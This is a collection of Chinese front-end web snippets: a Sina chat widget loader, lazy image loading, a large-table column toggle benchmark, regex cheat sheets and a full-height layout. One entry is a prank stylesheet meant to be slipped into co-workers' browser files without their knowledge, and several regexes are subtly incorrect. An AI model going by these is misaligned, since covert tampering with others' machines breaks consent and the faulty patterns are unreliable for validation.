<meta name="description" content="" />
</head>
<body>
<!-- webim js begin -->
<script src="http://sjs.sinajs.cn/webchat/common/miniDynamicLoad.js"></script>
<script type="text/javascript">
	var wuc_chatroom;
	//加载样式表
	WUC.dynamicLoad.load
	(
		[
		{url:'http://sjs.sinajs.cn/webchat/universal/chatroomUnive.css',charset:"gbk"}
		]
		,"css");
		//加载js
		WUC.dynamicLoad.load(
		[
		{url:'http://sjs.sinajs.cn/webchat/common/baseMerge.js',charset:"gbk"}, 
		{url:'http://sjs.sinajs.cn/webchat/apps/universal/webucUnive.js',charset:"gbk"}, 
		{url:'http://sjs.sinajs.cn/webchat/universal/chatroomUnive.js',charset:"gbk"},
		{url:'http://i.sso.sina.com.cn/js/ssologin.js',charset:'utf-8'}
		],
		"script",
		function()
		{
			wuc_chatroom = new WUCChatroom(0,'microshaoft','粉丝');
			wuc_chatroom.setChatroomSize(604,375);
			jQuery.noConflict();
		}
	);
</script>
<!-- webim body js end -->
 </body>
</html>

#T=延迟加载 图片 tudou
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
</head>
<body>
	能看的见到图片：<img src="http://at-img4.tdimg.com/board/2010/5/tylc-115X55.jpg"/>

	<div id="lazyBox" style="margin-top:100px;">
	 一开始看不到的图片：
	 <img width="120" height="90" style="border:1px solid blue;" class="lazyImg" alt="http://i01.img.tudou.com/data/imgs/i/051/720/095/p.jpg" src="http://css.tudouui.com/skin/__g/img/sprite.gif" coords="_DAA"/>
	 <img width="120" height="90" style="border:1px solid blue;" class="lazyImg" alt="http://i01.img.tudou.com/data/imgs/i/051/871/396/m20.jpg" src="http://css.tudouui.com/skin/__g/img/sprite.gif" coords="_DBA"/>
  </div>
	<div style="height:1000px;">
  </div>
  <script type="text/javascript">
	var hasShow = false;
	$(window).bind("scroll",function(){
		if(hasShow==true){
			$(window).unbind("scroll");
			return;
		}
		var t = $(document).scrollTop();
		if(t>50){
			// 滚动高度超过50，加载图片
			hasShow = true;
			$("#lazyBox .lazyImg").each(function(){
				$(this).attr("src",$(this).attr("alt"));
			});
		}
	});
  </script>
</body>
</html>

#T=隐藏/显示万行表格列只需 60毫秒
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title> new document </title>
  <meta name="generator" content="editplus" />
  <meta name="author" content="" />
  <meta name="keywords" content="" />
  <meta name="description" content="" />
 </head>

 <body>
  <style>
table
{
    border-collapse:collapse;
    table-layout:fixed;
    overflow:hidden;
}
td
{
    overflow:hidden;
    white-space: nowrap;
}
</style>
<body>
<input type=button onclick=createTable() value='创建表格：使用 thead'>
<input type=button onclick=createTable(1) value='创建表格：使用 colgroup'>
<br>
<input type=button onclick=hideCol(1) value='隐藏第 2 列'>
<input type=button onclick=showCol(1) value='显示第 2 列'>
&nbsp;&nbsp;
<input type=button onclick=hideCol_fast(1) value='快速隐藏第 2 列'>
<input type=button onclick=showCol_fast(1) value='快速显示第 2 列'>
<div id=tableBox></div>
<script>

var tableRowsLen = 10000; // 创建万行表格

//--------------------------------------------------------
// 时间转为时间戳（毫秒）
function time2stamp(){var d=new Date();return Date.parse(d)+d.getMilliseconds();} 

//--------------------------------------------------------
// 创建表格
function createTable(isUseColGroup)
{
    if (isUseColGroup) // 使用 colgroup 标签
    {
        var str = "<table border=1>" +
                    "<colgroup>" + 
                            "<col width=100 />" +
                            "<col width=200 />" + 
                            "<col width=50 />" + 
                    "<\/colgroup>" +
                    "<tbody>";
    }
    else
    {
        // 使用 thead 标签
        var str = "<table border=1>" +
                    "<thead>" + 
                        "<tr>" +
                            "<th width=100>col1<\/th>" +
                            "<th width=200>col2<\/th>" + 
                            "<th width=50>col3<\/th>" + 
                        "<\/tr>" +
                    "<\/thead>" +
                    "<tbody>";
    }

    var arr = [];
    for (var i=0; i<tableRowsLen; i++)
    {
        arr[i] = "<tr><td>" + i + "1<\/td><td>" + i + "2</td><td>" + i + "3<\/td></tr>";
    }
    str += arr.join("") + "</tbody><\/table>"; // 用 join() 方式快速构建字串，速度极快
    tableBox.innerHTML = str; // 生成 table
}

//--------------------------------------------------------
// 隐藏/显示指定列
function hideCol(colIdx){hideOrShowCol(colIdx, 0);}
function showCol(colIdx){hideOrShowCol(colIdx, 1);}
// - - - - - - - - - - - - - - - - - - - - - - - - - - - -
function hideOrShowCol(colIdx, isShow)
{
    var t1 = time2stamp(); // 
    var table = tableBox.children[0];
    var rowsLen = table.rows.length;
    var lastTr = table.rows[0];

    if (rowsLen > 1001) 
    {
        if (!confirm("将要对 1000 行以上的表格操作，这将非常耗时（甚至导致浏览器死掉）。\n您确定要继续吗？"))
            return;
    }

    for (var i=0; i<rowsLen; i++)
    {
        var tr = table.rows[i];
        tr.children[colIdx].style.display = isShow ? "" : "none";
    }
    
    var t2 = time2stamp();
    alert("耗时：" + (t2 - t1) + " 毫秒");
}

//--------------------------------------------------------
// 隐藏/显示指定列 - 快速
function hideCol_fast(colIdx){hideOrShowCol_fast(colIdx, 0);}
function showCol_fast(colIdx){hideOrShowCol_fast(colIdx, 1);}
// - - - - - - - - - - - - - - - - - - - - - - - - - - - -
function hideOrShowCol_fast(colIdx, isShow)
{
    var t1 = time2stamp(); // 
    var table = tableBox.children[0];
    var thead = table.children[0]; // 可能是 thead 或者 tbody，也可能是 colgroup
    if (thead.tagName.toLowerCase()=="colgroup") // 对 colgroup 特殊处理
    {
        var td = thead.children[colIdx];
    }
    else
    {
        // 注意：如果表格没有 thead 和 tbody 标签，则 table.children[0] 是 tbody
        var tr = thead.children[0];
        var td = tr.children[colIdx];
    }
    td.style.width = isShow ? 200 : 0;
    
    var t2 = time2stamp();
    alert("耗时：" + (t2 - t1) + " 毫秒");
}

//--------------------------------------------------------
createTable();
</script>


 </body>
</html>

#T=愚人节恶搞 css chrome
/*
aprilFools.css
Written by Wes Bos
I assume no responsibility for angry co-workers or lost productivity
 
Put these CSS definitons into your co-workers Custom.css file.
They will be applied to every website they visit as well as their developer tools.
 
Mac: ~/Library/Application Support/Google/Chrome/Default/User StyleSheets/Custom.css
 
PC: C:/Users/YourUsername/AppData/Local/Google/Chrome/User Data/Default/User StyleSheets/Custom.css
 
Ubuntu (Chromium): ~/.config/chromium/Default/User StyleSheets/Custom.css
*/
 
/*
Turn every website upside down
*/
body {
  /*-webkit-transform: rotate(180deg);*/
}
 
/*
blur every website for a split second every 30 seconds
*/
body {
  /*-webkit-animation: blur 30s infinite;*/
}
 
/*
Spin every Website
*/
body {
  /*-webkit-animation: spin 5s linear infinite;*/
}
 
/*
Flip all images upside down
*/
img {
  /*-webkit-transform: rotate(180deg);*/
}
 
/*
COMIC SANS EVERYTHING
*/
 
body, p, body p, body div p {
  /*font-family: 'Comic Sans MS', cursive !important;*/
}
 
/*
Spin all images
*/
img {
  /*-webkit-animation: spin 1s linear infinite;*/
}
 
/*
Hide every 2nd paragraph element on a page
*/
p:nth-child(2) {
  /*display:none !important;*/
}
 
/*
Spin dev tools round and round
*/
#T=预加载图片
function loadImage(url, callback) {     
    var img = new Image(); //创建一个Image对象，实现图片的预下载     
    img.onload = function(){
        img.onload = null;
        callback(img);
    }
    img.src = url; 
}
#T=正则表达式
匹配中文字符的正则表达式： [\u4e00-\u9fa5] 
匹配双字节字符（包括汉字在内）：[^\x00-\xff] 
匹配空行的正则表达式：\n[\s| ]*\r 
匹配 HTML 标记的正则表达式：<(.*)>.*<\/\1>|<(.*) \/>
匹配首尾空格的正则表达式：(^\s*)|(\s*$) 
匹配 IP 地址的正则表达式：/(\d+)\.(\d+)\.(\d+)\.(\d+)/g
匹配 Email 地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*
匹配网址 URL 的正则表达式：http://(/[\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)?
sql 语句：^(select|drop|delete|create|update|insert).*$ 
非负整数：^\d+$ 
正整数：^[0-9]*[1-9][0-9]*$ 
非正整数：^((-\d+)|(0+))$ 
负整数：^-[0-9]*[1-9][0-9]*$ 
整数：^-?\d+$ 
非负浮点数：^\d+(\.\d+)?$ 
正浮点数：^((0-9)+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 
非正浮点数：^((-\d+\.\d+)?)|(0+(\.0+)?))$ 
英文字符串：^[A-Za-z]+$ 
英文大写串：^[A-Z]+$ 
英文小写串：^[a-z]+$ 
英文字符数字串：^[A-Za-z0-9]+$ 
英数字加下划线串：^\w+$ 
E-mail地址：^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$ 
URL：^[a-zA-Z]+://(\w+(-\w+)*)(\.(\w+(-\w+)*))*(\?\s*)?$ 或：^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\':+!]*([^<>\"\"])*$ 
邮政编码：^[1-9]\d{5}$ 
电话号码：^((\(\d{2,3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}(\-\d{1,4})?$ 
手机号码：^((\(\d{2,3}\))|(\d{3}\-))?13\d{9}$ 
双字节字符（包括汉字在内）：^\x00-\xff 
匹配首尾空格：(^\s*)|(\s*$)
匹配 HTML 标记：<(.*)>.*<\/\1>|<(.*) \/> 
匹配空行：\n[\s| ]*\r 
提取信息中的网络链接：(h|H)(r|R)(e|E)(f|F) *= *('|")?(\w|\\|\/|\.)+('|"| *|>)? 
提取信息中的邮件地址：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)* 
提取信息中的图片链接：(s|S)(r|R)(c|C) *= *('|")?(\w|\\|\/|\.)+('|"| *|>)? 
提取信息中的 IP 地址：(\d+)\.(\d+)\.(\d+)\.(\d+) 
提取信息中的中国手机号码：(86)*0*13\d{9} 
提取信息中的中国固定电话号码：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{8} 
提取信息中的中国电话号码（包括移动和固定电话）：(\(\d{3,4}\)|\d{3,4}-|\s)?\d{7,14} 
提取信息中的中国邮政编码：[1-9]{1}(\d+){5} 
提取信息中的浮点数（即小数）：(-?\d*)\.?\d+ 
提取信息中的任何数字 ：(-?\d*)(\.\d+)? 
IP：(\d+)\.(\d+)\.(\d+)\.(\d+) 
电话区号：^0\d{2,3}$
腾讯 QQ 号：^[1-9]*[1-9][0-9]*$ 
帐号（字母开头，允许 5-16 字节，允许字母数字下划线）：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 
中文、英文、数字及下划线：^[\u4e00-\u9fa5_a-zA-Z0-9]+$
#T=正则表达式收集
常用的正则表达式收集
 备注：正则表达式真的很头疼，收集起来，用起来很方便的。

  常用的元字符

.	匹配除换行符以外的任意字符
\w	匹配字母或数字或下划线或汉字
\s	匹配任意的空白符
\d	匹配数字
\b	匹配单词的开始或结束
^	匹配字符串的开始
$	匹配字符串的结束
常用的限定符

 	 
*	重复零次或更多次
+	重复一次或更多次
?	重复零次或一次
{n}	重复n次
{n,}	重复n次或更多次
{n,m}	重复n到m次
 

　常用的反译代码　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　

\W	匹配任意不是字母，数字，下划线，汉字的字符
\S	匹配任意不是空白符的字符
\D	匹配任意非数字的字符
\B	匹配不是单词开头或结束的位置
[^x]	匹配除了x以外的任意字符
[^aeiou]	匹配除了aeiou这几个字母以外的任意字符
　常用的分组语法　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　

捕获	(exp)	匹配exp,并捕获文本到自动命名的组里
(?<name>exp)	匹配exp,并捕获文本到名称为name的组里，也可以写成(?'name'exp)
(?:exp)	匹配exp,不捕获匹配的文本，也不给此分组分配组号
零宽断言	(?=exp)	匹配exp前面的位置
(?<=exp)	匹配exp后面的位置
(?!exp)	匹配后面跟的不是exp的位置
(?<!exp)	匹配前面不是exp的位置
注释	(?#comment)	这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读
　　　惰性限定符　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　

*?	重复任意次，但尽可能少重复
+?	重复1次或更多次，但尽可能少重复
??	重复0次或1次，但尽可能少重复
{n,m}?	重复n到m次，但尽可能少重复
{n,}?	重复n次以上，但尽可能少重复
　　　　其他匹配

\a	报警字符(打印它的效果是电脑嘀一声)
\b	通常是单词分界位置，但如果在字符类里使用代表退格
\t	制表符，Tab
\r	回车
\v	竖向制表符
\f	换页符
\n	换行符
\e	Escape
\0nn	ASCII代码中八进制代码为nn的字符
\xnn	ASCII代码中十六进制代码为nn的字符
\unnnn	Unicode代码中十六进制代码为nnnn的字符
\cN	ASCII控制字符。比如\cC代表Ctrl+C
\A	字符串开头(类似^，但不受处理多行选项的影响)
\Z	字符串结尾或行尾(不受处理多行选项的影响)
\z	字符串结尾(类似$，但不受处理多行选项的影响)
\G	当前搜索的开头
\p{name}	Unicode中命名为name的字符类，例如\p{IsGreek}
(?>exp)	贪婪子表达式
(?<x>-<y>exp)	平衡组
(?im-nsx:exp)	在子表达式exp中改变处理选项
(?im-nsx)	为表达式后面的部分改变处理选项
(?(exp)yes|no)	把exp当作零宽正向先行断言，如果在这个位置能匹配，使用yes作为此组的表达式；否则使用no
(?(exp)yes)	同上，只是使用空表达式作为no
(?(name)yes|no)	如果命名为name的组捕获到了内容，使用yes作为表达式；否则使用no
(?(name)yes)	同上，只是使用空表达式作为no
 

 

 

1、匹配中文字符的正则表达式： [\u4e00-\u9fa5]
　　评注：匹配中文还真是个头疼的事，有了这个表达式就好办了

2、匹配双字节字符(包括汉字在内)：[^\x00-\xff]
　　评注：可以用来计算字符串的长度（一个双字节字符长度计2，ASCII字符计1）

3、匹配空白行的正则表达式：\n\s*\r
　　评注：可以用来删除空白行

4、匹配HTML标记的正则表达式：<(\S*?)[^>]*>.*?</\1>|<.*? />
　　评注：网上流传的版本太糟糕，上面这个也仅仅能匹配部分，对于复杂的嵌套标记依旧无能为力

5、匹配首尾空白字符的正则表达式：^\s*|\s*$
　　评注：可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式

6、匹配Email地址的正则表达式：\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*
　　评注：表单验证时很实用

7、匹配网址URL的正则表达式：[a-zA-z]+://[^\s]*
　　评注：网上流传的版本功能很有限，上面这个基本可以满足需求

8、匹配帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$
　　评注：表单验证时很实用

9、匹配国内电话号码：\d{3}-\d{8}|\d{4}-\d{7}
　　评注：匹配形式如 0511-4405222 或 021-87888822

10、匹配腾讯QQ号：[1-9][0-9]{4,}
　　评注：腾讯QQ号从10000开始

11、匹配中国邮政编码：[1-9]\d{5}(?!\d)
　　评注：中国邮政编码为6位数字

12、匹配身份证：\d{15}|\d{18}
　　评注：中国的身份证为15位或18位

13、匹配ip地址：\d+\.\d+\.\d+\.\d+
　　评注：提取ip地址时有用

14、匹配特定数字：
^[1-9]\d*$　 　 //匹配正整数
^-[1-9]\d*$ 　 //匹配负整数
^-?[1-9]\d*$　　 //匹配整数
^[1-9]\d*|0$　 //匹配非负整数（正整数 + 0）
^-[1-9]\d*|0$　　 //匹配非正整数（负整数 + 0）
^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$　　 //匹配正浮点数
^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$　 //匹配负浮点数
^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$　 //匹配浮点数
^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$　　 //匹配非负浮点数（正浮点数 + 0）
^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$　　//匹配非正浮点数（负浮点数 + 0）
　　评注：处理大量数据时有用，具体应用时注意修正

15、匹配特定字符串：
^[A-Za-z]+$　　//匹配由26个英文字母组成的字符串
^[A-Z]+$　　//匹配由26个英文字母的大写组成的字符串
^[a-z]+$　　//匹配由26个英文字母的小写组成的字符串
^[A-Za-z0-9]+$　　//匹配由数字和26个英文字母组成的字符串
^\w+$　　//匹配由数字、26个英文字母或者下划线组成的字符串

非常好的学习资源：http://www.jb51.net/tools/zhengze.html#metacode
#T=自适应浏览器窗口大小
<!-- Put IE into quirks mode -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=gb2312"/>
<title>自适应满屏高度的布局-冰极峰</title>
<style type="text/css">
html {height:100%;max-height:100%;padding:0;margin:0;border:0;background:#fff;font-size:76%;font-family:georgia, palatino linotype, times new roman, serif,"宋体";
/* hide overflow:hidden from IE5/Mac */ 
/* \*/ 
overflow: hidden; 
/* */ 
}
html {
    scrollbar-face-color:orange;
    scrollbar-highlight-color:#fff;
    scrollbar-shadow-color:#c00;
    scrollbar-3dlight-color:#c00;
    scrollbar-arrow-color:#000;
    scrollbar-track-color:#c0c0c0;
    scrollbar-darkshadow-color:#fff;
    }
body{height:100%;max-height:100%;overflow:hidden;padding:0;margin:0; border:0;}
^#content{overflow:auto; position:absolute; z-index:3; top:100px; width:96%;bottom:80px; left:2%; background:#666;}
*html #content {top:0; left:2%; height:100%; max-height:100%; width:96%; overflow:auto;position:absolute; z-index:3; border-top:100px solid #fff; border-bottom:80px solid #fff;}
^#head{position:absolute;margin:0;top:0;left:1px;display:block;width:100%;height:90px;background:orange;background-position:0 0; background-repeat:no-repeat;font-size:4em;z-index:5;overflow:hidden;color:#fff;border-bottom:1px #c0c0c0 solid;text-align:center;}
^#foot{position:absolute; margin:0;bottom:0;left:2%;display:block;width:96%;height:70px;font-size:1em;z-index:5;overflow:hidden;color:#fff;text-align:center;}
^#content p,h2{padding:10px;font-size:12px;color:#fff;}
^#content p.bold {font-size:1.2em; font-weight:bold;color:red;}
^#logo{height:75px;line-height:75px;text-align:center;display:block;}
.footleft{width:20%;height:70px;line-height:70px;float:left;border:1px #c0c0c0 solid;background:blue;}
.footmid{width:58%;height:70px;line-height:70px;margin-left:1%;float:left;border:1px #c0c0c0 solid;background:blue;}
.footright{width:20%;height:70px;line-height:70px;float:right;border:1px #c0c0c0 solid;background:blue;}
a:link,a:visited{color:#fff;}
</style>
</head>
<body>
<div id="head"> 
    <span id="logo">100%高度全屏自适应布局</span> 
</div>
<div id="foot">
    <div class="footleft"><a href="http://www.cnblogs.com/binyong">冰极峰</a></div>
    <div class="footmid"><a href="http://www.cnblogs.com/binyong">冰极峰</a></div>
    <div class="footright"><a href="http://www.cnblogs.com/binyong">冰极峰</a></div>
</div>
<div id="content">
    <h2>此布局惟一的遗憾是在IE6以下浏览器中显示为怪异模式,因为HTML代码的头一句加了一个注释,如果删除后在IE中滚动条高度显示不全.</h2>
    <p class="bold">此布局在以下浏览器中测试通过: IE5.5,IE6,IE7,TT,Opera 9.63,Firefox3.0,谷歌，IE8未作测试。</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>

</div>
</body>
</html>

#